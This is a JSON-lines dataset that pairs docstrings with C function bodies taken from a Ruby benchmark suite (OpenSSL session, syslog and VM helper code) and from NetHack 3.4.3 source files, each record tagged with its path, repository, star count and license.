{"docstring": "/*\n * call-seq:\n *    Session.new(SSLSocket | string) => session\n *\n * === Parameters\n * +SSLSocket+ is an OpenSSL::SSL::SSLSocket\n * +string+ must be a DER or PEM encoded Session.\n*/\n", "func_signal": "static VALUE ossl_ssl_session_initialize(VALUE self, VALUE arg1)", "code": "{\n\tSSL_SESSION *ctx = NULL;\n\n\tif (RDATA(self)->data)\n\t\tossl_raise(eSSLSession, \"SSL Session already initialized\");\n\n\tif (rb_obj_is_instance_of(arg1, cSSLSocket)) {\n\t\tSSL *ssl;\n\n\t\tData_Get_Struct(arg1, SSL, ssl);\n\n\t\tif (!ssl || (ctx = SSL_get1_session(ssl)) == NULL)\n\t\t\tossl_raise(eSSLSession, \"no session available\");\n\t} else {\n\t\tBIO *in = ossl_obj2bio(arg1);\n\n\t\tctx = PEM_read_bio_SSL_SESSION(in, NULL, NULL, NULL);\n\n\t\tif (!ctx) {\n\t\t\t(void)BIO_reset(in);\n\t\t\tctx = d2i_SSL_SESSION_bio(in, NULL);\n\t\t}\n\n\t\tBIO_free(in);\n\n\t\tif (!ctx)\n\t\t\tossl_raise(rb_eArgError, \"unknown type\");\n\t}\n\n\t/* should not happen */\n\tif (ctx == NULL)\n\t\tossl_raise(eSSLSession, \"ctx not set - internal error\");\n\n\tRDATA(self)->data = ctx;\n\n\treturn self;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_ssl_session.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    session.to_pem -> String\n *\n * Returns a PEM encoded String that contains the Session object.\n*/\n", "func_signal": "static VALUE ossl_ssl_session_to_pem(VALUE self)", "code": "{\n\tSSL_SESSION *ctx;\n\tBIO *out;\n\tBUF_MEM *buf;\n\tVALUE str;\n\tint i;\n         \n\tGetSSLSession(self, ctx);\n\n\tif (!(out = BIO_new(BIO_s_mem()))) {\n\t\tossl_raise(eSSLSession, \"BIO_s_mem()\");\n\t}\n\n\tif (!(i=PEM_write_bio_SSL_SESSION(out, ctx))) {\n\t\tBIO_free(out);\n\t\tossl_raise(eSSLSession, \"SSL_SESSION_print()\");\n\t}\n\n\tBIO_get_mem_ptr(out, &buf);\n\tstr = rb_str_new(buf->data, buf->length);\n\tBIO_free(out);\n\n\treturn str;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_ssl_session.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/* yield */\n", "func_signal": "static inline int\nblock_proc_is_lambda(const VALUE procval)", "code": "{\n    rb_proc_t *proc;\n\n    if (procval) {\n\tGetProcPtr(procval, proc);\n\treturn proc->is_lambda;\n    }\n    else {\n\treturn 0;\n    }\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\vm_insnhelper.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    session.to_der -> aString\n *\n * Returns an ASN1 encoded String that contains the Session object.\n*/\n", "func_signal": "static VALUE ossl_ssl_session_to_der(VALUE self)", "code": "{\n\tSSL_SESSION *ctx;\n\tunsigned char buf[1024*10], *p;\n\tint len;\n\n\tGetSSLSession(self, ctx);\n\n\tp = buf;\n\tlen = i2d_SSL_SESSION(ctx, &p);\n\n\tif (len <= 0)\n\t\tossl_raise(eSSLSession, \"i2d_SSL_SESSION\");\n\telse if (len >= sizeof(buf))\n\t\tossl_raise(eSSLSession, \"i2d_SSL_SESSION too large\");\n\n\treturn rb_str_new((const char *) p, len);\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_ssl_session.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/* Syslog module methods */\n", "func_signal": "static VALUE mSyslog_close(VALUE self)", "code": "{\n    rb_secure(4);\n    if (!syslog_opened) {\n        rb_raise(rb_eRuntimeError, \"syslog not opened\");\n    }\n\n    closelog();\n\n    free((void *)syslog_ident);\n    syslog_ident = NULL;\n    syslog_options = syslog_facility = syslog_mask = -1;\n    syslog_opened = 0;\n\n    return Qnil;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\syslog\\syslog.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    session.to_text -> String\n *\n * Shows everything in the Session object.\n*/\n", "func_signal": "static VALUE ossl_ssl_session_to_text(VALUE self)", "code": "{\n\tSSL_SESSION *ctx;\n\tBIO *out;\n\tBUF_MEM *buf;\n\tVALUE str;\n         \n\tGetSSLSession(self, ctx);\n\n\tif (!(out = BIO_new(BIO_s_mem()))) {\n\t\tossl_raise(eSSLSession, \"BIO_s_mem()\");\n\t}\n\n\tif (!SSL_SESSION_print(out, ctx)) {\n\t\tBIO_free(out);\n\t\tossl_raise(eSSLSession, \"SSL_SESSION_print()\");\n\t}\n\n\tBIO_get_mem_ptr(out, &buf);\n\tstr = rb_str_new(buf->data, buf->length);\n\tBIO_free(out);\n\n\treturn str;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_ssl_session.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/* Init for package syslog */\n", "func_signal": "void Init_syslog()", "code": "{\n    mSyslog = rb_define_module(\"Syslog\");\n \n    mSyslogConstants = rb_define_module_under(mSyslog, \"Constants\");\n\n    rb_include_module(mSyslog, mSyslogConstants);\n\n    rb_define_module_function(mSyslog, \"open\", mSyslog_open, -1);\n    rb_define_module_function(mSyslog, \"reopen\", mSyslog_reopen, -1);\n    rb_define_module_function(mSyslog, \"open!\", mSyslog_reopen, -1);\n    rb_define_module_function(mSyslog, \"opened?\", mSyslog_isopen, 0);\n\n    rb_define_module_function(mSyslog, \"ident\", mSyslog_ident, 0);\n    rb_define_module_function(mSyslog, \"options\", mSyslog_options, 0);\n    rb_define_module_function(mSyslog, \"facility\", mSyslog_facility, 0);\n\n    rb_define_module_function(mSyslog, \"log\", mSyslog_log, -1);\n    rb_define_module_function(mSyslog, \"close\", mSyslog_close, 0);\n    rb_define_module_function(mSyslog, \"mask\", mSyslog_get_mask, 0);\n    rb_define_module_function(mSyslog, \"mask=\", mSyslog_set_mask, 1);\n\n    rb_define_module_function(mSyslog, \"LOG_MASK\", mSyslogConstants_LOG_MASK, 1);\n    rb_define_module_function(mSyslog, \"LOG_UPTO\", mSyslogConstants_LOG_UPTO, 1);\n\n    rb_define_module_function(mSyslog, \"inspect\", mSyslog_inspect, 0);\n    rb_define_module_function(mSyslog, \"instance\", mSyslog_instance, 0);\n\n    rb_define_module_function(mSyslogConstants, \"LOG_MASK\", mSyslogConstants_LOG_MASK, 1);\n    rb_define_module_function(mSyslogConstants, \"LOG_UPTO\", mSyslogConstants_LOG_UPTO, 1);\n\n#define rb_define_syslog_const(id) \\\n    rb_define_const(mSyslogConstants, #id, INT2NUM(id))\n\n    /* Various options when opening log */\n#ifdef LOG_PID\n    rb_define_syslog_const(LOG_PID);\n#endif\n#ifdef LOG_CONS\n    rb_define_syslog_const(LOG_CONS);\n#endif\n#ifdef LOG_ODELAY\n    rb_define_syslog_const(LOG_ODELAY); /* deprecated */\n#endif\n#ifdef LOG_NDELAY\n    rb_define_syslog_const(LOG_NDELAY);\n#endif\n#ifdef LOG_NOWAIT\n    rb_define_syslog_const(LOG_NOWAIT); /* deprecated */\n#endif\n#ifdef LOG_PERROR\n    rb_define_syslog_const(LOG_PERROR);\n#endif\n\n    /* Various syslog facilities */\n#ifdef LOG_AUTH\n    rb_define_syslog_const(LOG_AUTH);\n#endif\n#ifdef LOG_AUTHPRIV\n    rb_define_syslog_const(LOG_AUTHPRIV);\n#endif\n#ifdef LOG_CONSOLE\n    rb_define_syslog_const(LOG_CONSOLE);\n#endif\n#ifdef LOG_CRON\n    rb_define_syslog_const(LOG_CRON);\n#endif\n#ifdef LOG_DAEMON\n    rb_define_syslog_const(LOG_DAEMON);\n#endif\n#ifdef LOG_FTP\n    rb_define_syslog_const(LOG_FTP);\n#endif\n#ifdef LOG_KERN\n    rb_define_syslog_const(LOG_KERN);\n#endif\n#ifdef LOG_LPR\n    rb_define_syslog_const(LOG_LPR);\n#endif\n#ifdef LOG_MAIL\n    rb_define_syslog_const(LOG_MAIL);\n#endif\n#ifdef LOG_NEWS\n    rb_define_syslog_const(LOG_NEWS);\n#endif\n#ifdef LOG_NTP\n   rb_define_syslog_const(LOG_NTP);\n#endif\n#ifdef LOG_SECURITY\n    rb_define_syslog_const(LOG_SECURITY);\n#endif\n#ifdef LOG_SYSLOG\n    rb_define_syslog_const(LOG_SYSLOG);\n#endif\n#ifdef LOG_USER\n    rb_define_syslog_const(LOG_USER);\n#endif\n#ifdef LOG_UUCP\n    rb_define_syslog_const(LOG_UUCP);\n#endif\n#ifdef LOG_LOCAL0\n    rb_define_syslog_const(LOG_LOCAL0);\n#endif\n#ifdef LOG_LOCAL1\n    rb_define_syslog_const(LOG_LOCAL1);\n#endif\n#ifdef LOG_LOCAL2\n    rb_define_syslog_const(LOG_LOCAL2);\n#endif\n#ifdef LOG_LOCAL3\n    rb_define_syslog_const(LOG_LOCAL3);\n#endif\n#ifdef LOG_LOCAL4\n    rb_define_syslog_const(LOG_LOCAL4);\n#endif\n#ifdef LOG_LOCAL5\n    rb_define_syslog_const(LOG_LOCAL5);\n#endif\n#ifdef LOG_LOCAL6\n    rb_define_syslog_const(LOG_LOCAL6);\n#endif\n#ifdef LOG_LOCAL7\n    rb_define_syslog_const(LOG_LOCAL7);\n#endif\n\n#define rb_define_syslog_shortcut(name) \\\n    rb_define_module_function(mSyslog, #name, mSyslog_##name, -1)\n\n    /* Various syslog priorities and the shortcut methods */\n#ifdef LOG_EMERG\n    rb_define_syslog_const(LOG_EMERG);\n    rb_define_syslog_shortcut(emerg);\n#endif\n#ifdef LOG_ALERT\n    rb_define_syslog_const(LOG_ALERT);\n    rb_define_syslog_shortcut(alert);\n#endif\n#ifdef LOG_CRIT\n    rb_define_syslog_const(LOG_CRIT);\n    rb_define_syslog_shortcut(crit);\n#endif\n#ifdef LOG_ERR\n    rb_define_syslog_const(LOG_ERR);\n    rb_define_syslog_shortcut(err);\n#endif\n#ifdef LOG_WARNING\n    rb_define_syslog_const(LOG_WARNING);\n    rb_define_syslog_shortcut(warning);\n#endif\n#ifdef LOG_NOTICE\n    rb_define_syslog_const(LOG_NOTICE);\n    rb_define_syslog_shortcut(notice);\n#endif\n#ifdef LOG_INFO\n    rb_define_syslog_const(LOG_INFO);\n    rb_define_syslog_shortcut(info);\n#endif\n#ifdef LOG_DEBUG\n    rb_define_syslog_const(LOG_DEBUG);\n    rb_define_syslog_shortcut(debug);\n#endif\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\syslog\\syslog.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/* Package helper routines */\n", "func_signal": "static void syslog_write(int pri, int argc, VALUE *argv)", "code": "{\n    VALUE str;\n\n    rb_secure(4);\n    if (argc < 1) {\n        rb_raise(rb_eArgError, \"no log message supplied\");\n    }\n\n    if (!syslog_opened) {\n        rb_raise(rb_eRuntimeError, \"must open syslog before write\");\n    }\n\n    str = rb_f_sprintf(argc, argv);\n\n    syslog(pri, \"%s\", RSTRING_PTR(str));\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\syslog\\syslog.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * call-seq:\n *    session.time -> Time\n *\n*/\n", "func_signal": "static VALUE ossl_ssl_session_get_time(VALUE self)", "code": "{\n\tSSL_SESSION *ctx;\n\ttime_t t;\n\n\tGetSSLSession(self, ctx);\n\n\tt = SSL_SESSION_get_time(ctx);\n\n\tif (t == 0)\n\t\treturn Qnil;\n\n\treturn rb_funcall(rb_cTime, rb_intern(\"at\"), 1, TIMET2NUM(t));\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_ssl_session.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/* svar */\n", "func_signal": "static inline NODE *\nlfp_svar_place(rb_thread_t *th, VALUE *lfp)", "code": "{\n    VALUE *svar;\n\n    if (lfp && th->local_lfp != lfp) {\n\tsvar = &lfp[-1];\n    }\n    else {\n\tsvar = &th->local_svar;\n    }\n    if (NIL_P(*svar)) {\n\t*svar = (VALUE)NEW_IF(Qnil, Qnil, Qnil);\n    }\n    return (NODE *)*svar;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\vm_insnhelper.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*\n * Public\n */\n", "func_signal": "VALUE\nossl_x509attr_new(X509_ATTRIBUTE *attr)", "code": "{\n    X509_ATTRIBUTE *new;\n    VALUE obj;\n    \n    if (!attr) {\n\tnew = X509_ATTRIBUTE_new();\n    } else {\n\tnew = X509_ATTRIBUTE_dup(attr);\n    }\n    if (!new) {\n\tossl_raise(eX509AttrError, NULL);\n    }\n    WrapX509Attr(cX509Attr, obj, new);\n\n    return obj;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\ext\\openssl\\ossl_x509attr.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/*--\n * @brief on supplied all of optional, rest and post parameters.\n * @pre iseq is block style (not lambda style)\n */\n", "func_signal": "static inline int\nvm_yield_setup_block_args_complex(rb_thread_t *th, const rb_iseq_t *iseq,\n\t\t\t\t  int argc, VALUE *argv)", "code": "{\n    rb_num_t opt_pc = 0;\n    int i;\n    const int m = iseq->argc;\n    const int r = iseq->arg_rest;\n    int len = iseq->arg_post_len;\n    int start = iseq->arg_post_start;\n    int rsize = argc > m ? argc - m : 0;    /* # of arguments which did not consumed yet */\n    int psize = rsize > len ? len : rsize;  /* # of post arguments */\n    int osize = 0;  /* # of opt arguments */\n    VALUE ary;\n\n    /* reserves arguments for post parameters */\n    rsize -= psize;\n\n    if (iseq->arg_opts) {\n\tconst int opts = iseq->arg_opts - 1;\n\tif (rsize > opts) {\n            osize = opts;\n\t    opt_pc = iseq->arg_opt_table[opts];\n\t}\n\telse {\n            osize = rsize;\n\t    opt_pc = iseq->arg_opt_table[rsize];\n\t}\n    }\n    rsize -= osize;\n\n    if (0) {\n\tprintf(\" argc: %d\\n\", argc);\n\tprintf(\"  len: %d\\n\", len);\n\tprintf(\"start: %d\\n\", start);\n\tprintf(\"rsize: %d\\n\", rsize);\n    }\n\n    if (r == -1) {\n        /* copy post argument */\n        MEMMOVE(&argv[start], &argv[m+osize], VALUE, psize);\n    }\n    else {\n        ary = rb_ary_new4(rsize, &argv[r]);\n\n        /* copy post argument */\n        MEMMOVE(&argv[start], &argv[m+rsize+osize], VALUE, psize);\n        argv[r] = ary;\n    }\n\n    for (i=psize; i<len; i++) {\n\targv[start + i] = Qnil;\n    }\n\n    return (int)opt_pc;\n}", "path": "benchmarks\\rdoc\\ruby_trunk\\vm_insnhelper.c", "repo_name": "acangiano/ruby-benchmark-suite", "stars": 165, "license": "other", "language": "c", "size": 18500}
{"docstring": "/* Take a single bite from a piece of food, checking for choking and\n * modifying usedtime.  Returns 1 if they choked and survived, 0 otherwise.\n */\n", "func_signal": "STATIC_OVL int\nbite()", "code": "{\n\tif(victual.canchoke && u.uhunger >= 2000) {\n\t\tchoke(victual.piece);\n\t\treturn 1;\n\t}\n\tif (victual.doreset) {\n\t\tdo_reset_eat();\n\t\treturn 0;\n\t}\n\tforce_save_hs = TRUE;\n\tif(victual.nmod < 0) {\n\t\tlesshungry(-victual.nmod);\n\t\tconsume_oeaten(victual.piece, victual.nmod); /* -= -nmod */\n\t} else if(victual.nmod > 0 && (victual.usedtime % victual.nmod)) {\n\t\tlesshungry(1);\n\t\tconsume_oeaten(victual.piece, -1);\t\t  /* -= 1 */\n\t}\n\tforce_save_hs = FALSE;\n\trecalc_wt();\n\treturn 0;\n}", "path": "src\\eat.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* Return 1 if the record file was found */\n", "func_signal": "static boolean\nrecord_exists()", "code": "{\n    FILE *file;\n\n    if (file = fopenp(RECORD, \"r\")) {\n\tfclose(file);\n\treturn TRUE;\n    }\n    return FALSE;\n}", "path": "sys\\amiga\\amidos.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* all objects with their bypass bit set should now be reset to normal */\n", "func_signal": "void\nclear_bypasses()", "code": "{\n\tstruct obj *otmp, *nobj;\n\tstruct monst *mtmp;\n\n\tfor (otmp = fobj; otmp; otmp = nobj) {\n\t    nobj = otmp->nobj;\n\t    if (otmp->bypass) {\n\t\totmp->bypass = 0;\n\t\t/* bypass will have inhibited any stacking, but since it's\n\t\t   used for polymorph handling, the objects here probably\n\t\t   have been transformed and won't be stacked in the usual\n\t\t   manner afterwards; so don't bother with this */\n#if 0\n\t\tif (objects[otmp->otyp].oc_merge) {\n\t\t    xchar ox, oy;\n\n\t\t    (void) get_obj_location(otmp, &ox, &oy, 0);\n\t\t    stack_object(otmp);\n\t\t    newsym(ox, oy);\n\t\t}\n#endif\t/*0*/\n\t    }\n\t}\n\t/* invent and mydogs chains shouldn't matter here */\n\tfor (otmp = migrating_objs; otmp; otmp = otmp->nobj)\n\t    otmp->bypass = 0;\n\tfor (mtmp = fmon; mtmp; mtmp = mtmp->nmon) {\n\t    if (DEADMONSTER(mtmp)) continue;\n\t    for (otmp = mtmp->minvent; otmp; otmp = otmp->nobj)\n\t\totmp->bypass = 0;\n\t}\n\tfor (mtmp = migrating_mons; mtmp; mtmp = mtmp->nmon) {\n\t    for (otmp = mtmp->minvent; otmp; otmp = otmp->nobj)\n\t\totmp->bypass = 0;\n\t}\n\tflags.bypasses = FALSE;\n}", "path": "src\\worn.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/*\n *\t- A branch may not branch backwards - to avoid branch loops.\n *\t- A branch name must be unique.\n *\t  (ie. You can only have one entry point to each dungeon).\n *\t- If chained, the level used as reference for the chain\n *\t  must be in this dungeon, must be previously defined, and\n *\t  the level chained from must be \"non-probabilistic\" (ie.\n *\t  have a 100% chance of existing).\n */\n", "func_signal": "int\ncheck_branch()", "code": "{\n\tint i;\n\n\tif(!in_dungeon) {\n\t\tyyerror(\"Branch defined outside of dungeon.\");\n\t\treturn(0);\n\t}\n\n\tfor(i = 0; i < n_dgns; i++)\n\t    if(!strcmp(tmpdungeon[i].name, tmpbranch[n_brs].name)) {\n\n\t\tyyerror(\"Reverse branching not allowed.\");\n\t\treturn(0);\n\t    }\n\n\tif(tmpbranch[i].chain == -2) {\n\n\t\tyyerror(\"Invaild branch chain reference.\");\n\t\treturn(0);\n\t} else if(tmpbranch[i].chain != -1) {\t/* it is chained */\n\n\t    if(tmplevel[tmpbranch[i].chain].chance != 100) {\n\t\tyyerror(\"Branch cannot chain from a probabilistic level.\");\n\t\treturn(0);\n\t    }\n\t}\n\treturn(1);\t/* OK */\n}", "path": "sys\\share\\dgn_yacc.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* modify object wt. depending on time spent consuming it */\n", "func_signal": "STATIC_OVL void\nrecalc_wt()", "code": "{\n\tstruct obj *piece = victual.piece;\n\n#ifdef DEBUG\n\tdebugpline(\"Old weight = %d\", piece->owt);\n\tdebugpline(\"Used time = %d, Req'd time = %d\",\n\t\tvictual.usedtime, victual.reqtime);\n#endif\n\tpiece->owt = weight(piece);\n#ifdef DEBUG\n\tdebugpline(\"New weight = %d\", piece->owt);\n#endif\n}", "path": "src\\eat.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* this should be replaced */\n", "func_signal": "saveDiskPrompt(start)", "code": "{\n    char buf[BUFSIZ], *bp;\n    BPTR fileLock;\n\n    if (flags.asksavedisk) {\n\t    /* Don't prompt if you can find the save file */\n\tif (fileLock = Lock(SAVEF, SHARED_LOCK)) {\n\t    UnLock(fileLock);\n#if defined(TTY_GRAPHICS)\n\t    if(windowprocs.win_init_nhwindows!=amii_procs.win_init_nhwindows)\n\t\tclear_nhwindow( WIN_MAP );\n#endif\n#if defined(AMII_GRAPHICS)\n\t    if(windowprocs.win_init_nhwindows==amii_procs.win_init_nhwindows)\n\t\tclear_nhwindow( WIN_BASE );\n#endif\n\t    return 1;\n\t}\n\tpline( \"If save file is on a SAVE disk, put that disk in now.\" );\n\tif( strlen( SAVEF ) > QBUFSZ - 25 - 22 )\n\t    panic( \"not enough buffer space for prompt\" );\n/* THIS IS A HACK */\n#if defined(TTY_GRAPHICS)\n\tif(windowprocs.win_init_nhwindows!=amii_procs.win_init_nhwindows){\n\t    getlin(\"File name ?\",buf);\n\t    clear_nhwindow( WIN_MAP );\n\t}\n#endif\n#if defined(AMII_GRAPHICS)\n\tif(windowprocs.win_init_nhwindows==amii_procs.win_init_nhwindows){\n\t    getlind(\"File name ?\", buf, SAVEF);\n\t    clear_nhwindow( WIN_BASE );\n\t}\n#endif\n\tclear_nhwindow( WIN_MESSAGE);\n\tif (!start && *buf == '\\033')\n\t    return 0;\n\n    /* Strip any whitespace. Also, if nothing was entered except\n     * whitespace, do not change the value of SAVEF.\n     */\n\tfor (bp = buf; *bp; bp++) {\n\t    if (!isspace(*bp)) {\n\t    strncpy(SAVEF, bp, PATHLEN);\n\t    break;\n\t    }\n\t}\n    }\n    return 1;\n}", "path": "sys\\amiga\\amidos.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* '*' command; combines the ')' + '[' + '=' + '\"' + '(' commands;\n   show inventory of all currently wielded, worn, or used objects */\n", "func_signal": "int\ndoprinuse()", "code": "{\n\tstruct obj *otmp;\n\tint ct = 0;\n\tchar lets[52+1];\n\n\tfor (otmp = invent; otmp; otmp = otmp->nobj)\n\t    if (is_worn(otmp) || tool_in_use(otmp))\n\t\tlets[ct++] = obj_to_let(otmp);\n\tlets[ct] = '\\0';\n\tif (!ct) You(\"are not wearing or wielding anything.\");\n\telse (void) display_inventory(lets, FALSE);\n\treturn 0;\n}", "path": "src\\invent.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* get event from the queue but leave it there */\n", "func_signal": "PMSNHEvent mswin_input_peek()", "code": "{\n\tPMSNHEvent retval;\n\n\tif( !nhi_init_input ) mswin_nh_input_init();\n\n\tif( nhi_read_pos!=nhi_write_pos ) {\n\t\tretval = &nhi_input_buffer[nhi_read_pos];\n\t} else {\n\t\tretval = NULL;\n\t}\n\treturn retval;\n}", "path": "sys\\wince\\mhinput.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* initialize input queue */\n", "func_signal": "void mswin_nh_input_init()", "code": "{\n\tif( !nhi_init_input ) {\n\t\tnhi_init_input = 1;\n\n\t\tZeroMemory( nhi_input_buffer, sizeof(nhi_input_buffer) );\n\t\tnhi_read_pos = 0;\n\t\tnhi_write_pos = 0;\n\t}\n}", "path": "sys\\wince\\mhinput.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* Pre-map the sokoban levels */\n", "func_signal": "void\nsokoban_detect()", "code": "{\n\tregister int x, y;\n\tregister struct trap *ttmp;\n\tregister struct obj *obj;\n\n\t/* Map the background and boulders */\n\tfor (x = 1; x < COLNO; x++)\n\t    for (y = 0; y < ROWNO; y++) {\n\t    \tlevl[x][y].seenv = SVALL;\n\t    \tlevl[x][y].waslit = TRUE;\n\t    \tmap_background(x, y, 1);\n\t    \tfor (obj = level.objects[x][y]; obj; obj = obj->nexthere)\n\t    \t    if (obj->otyp == BOULDER)\n\t    \t    \tmap_object(obj, 1);\n\t    }\n\n\t/* Map the traps */\n\tfor (ttmp = ftrap; ttmp; ttmp = ttmp->ntrap) {\n\t    ttmp->tseen = 1;\n\t    map_trap(ttmp, 1);\n\t}\n}", "path": "src\\detect.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* the 'i' command */\n", "func_signal": "int\nddoinv()", "code": "{\n\t(void) display_inventory((char *)0, FALSE);\n\treturn 0;\n}", "path": "src\\invent.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/*\n *\t- A level must have a unique level name.\n *\t- If chained, the level used as reference for the chain\n *\t  must be in this dungeon, must be previously defined, and\n *\t  the level chained from must be \"non-probabilistic\" (ie.\n *\t  have a 100% chance of existing).\n */\n", "func_signal": "int\ncheck_level()", "code": "{\n\tint i;\n\n\tif(!in_dungeon) {\n\t\tyyerror(\"Level defined outside of dungeon.\");\n\t\treturn(0);\n\t}\n\n\tfor(i = 0; i < n_levs; i++)\n\t    if(!strcmp(tmplevel[i].name, tmplevel[n_levs].name)) {\n\t\tyyerror(\"Duplicate level name.\");\n\t\treturn(0);\n\t    }\n\n\tif(tmplevel[i].chain == -2) {\n\t\tyyerror(\"Invaild level chain reference.\");\n\t\treturn(0);\n\t} else if(tmplevel[i].chain != -1) {\t/* there is a chain */\n\t    /* KMH -- tmplevel[tmpbranch[i].chain].chance was in error */\n\t    if(tmplevel[tmplevel[i].chain].chance != 100) {\n\t\tyyerror(\"Level cannot chain from a probabilistic level.\");\n\t\treturn(0);\n\t    } else if(tmplevel[i].chain == n_levs) {\n\t\tyyerror(\"A level cannot chain to itself!\");\n\t\treturn(0);\n\t    }\n\t}\n\treturn(1);\t/* OK */\n}", "path": "sys\\share\\dgn_yacc.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/*\n * When saving bones, find priests that aren't on their shrine level,\n * and remove them.   This avoids big problems when restoring bones.\n */\n", "func_signal": "void\nclearpriests()", "code": "{\n    register struct monst *mtmp, *mtmp2;\n\n    for(mtmp = fmon; mtmp; mtmp = mtmp2) {\n\tmtmp2 = mtmp->nmon;\n\tif (!DEADMONSTER(mtmp) && mtmp->ispriest && !on_level(&(EPRI(mtmp)->shrlevel), &u.uz))\n\t    mongone(mtmp);\n    }\n}", "path": "src\\priest.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/*\n * Under MSDOS: Prompt for game disk, then check for record file.\n * For Amiga: do nothing, but called from restore.c\n */\n", "func_signal": "void\ngameDiskPrompt()", "code": "{}\n#endif\n\n/*\n * Add a slash to any name not ending in / or :.  There must\n * be room for the /.\n */\nvoid\nappend_slash(name)\nchar *name;\n{\n    char *ptr;\n\n    if (!*name)return;\n\n    ptr = eos(name) - 1;\n    if (*ptr != '/' && *ptr != ':') {\n\t*++ptr = '/';\n\t*++ptr = '\\0';\n    }\n}", "path": "sys\\amiga\\amidos.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* add event to the queue */\n", "func_signal": "void mswin_input_push(PMSNHEvent event)", "code": "{\n\tint new_write_pos;\n\n\tif( !nhi_init_input ) mswin_nh_input_init();\n\n\tnew_write_pos = (nhi_write_pos+1) % NH_INPUT_BUFFER_SIZE;\n\t\n\tif(new_write_pos!=nhi_read_pos) {\n\t\tmemcpy(nhi_input_buffer+nhi_write_pos, event, sizeof(*event));\n\t\tnhi_write_pos = new_write_pos;\n\t}\n\n}", "path": "sys\\wince\\mhinput.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* sort the inventory; used by addinv() and doorganize() */\n", "func_signal": "STATIC_OVL void\nreorder_invent()", "code": "{\n\tstruct obj *otmp, *prev, *next;\n\tboolean need_more_sorting;\n\n\tdo {\n\t    /*\n\t     * We expect at most one item to be out of order, so this\n\t     * isn't nearly as inefficient as it may first appear.\n\t     */\n\t    need_more_sorting = FALSE;\n\t    for (otmp = invent, prev = 0; otmp; ) {\n\t\tnext = otmp->nobj;\n\t\tif (next && inv_rank(next) < inv_rank(otmp)) {\n\t\t    need_more_sorting = TRUE;\n\t\t    if (prev) prev->nobj = next;\n\t\t    else      invent = next;\n\t\t    otmp->nobj = next->nobj;\n\t\t    next->nobj = otmp;\n\t\t    prev = next;\n\t\t} else {\n\t\t    prev = otmp;\n\t\t    otmp = next;\n\t\t}\n\t    }\n\t} while (need_more_sorting);\n}", "path": "src\\invent.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
